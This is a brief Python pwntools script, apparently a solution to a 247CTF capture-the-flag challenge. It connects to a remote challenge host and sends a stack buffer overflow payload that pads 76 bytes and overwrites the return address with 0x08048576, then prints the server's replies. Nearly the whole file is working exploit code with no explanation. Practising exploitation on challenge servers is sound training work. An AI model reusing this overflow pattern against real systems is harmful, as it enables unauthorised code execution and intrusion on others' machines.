from pwn import *
payload = "A"*76+"\x76\x85\x04\x08"
p = remote('bacf343c031e6b93.247ctf.com', 50378)
print(p.recvuntil('What do you have to say?'))
print(p.recvline())
p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
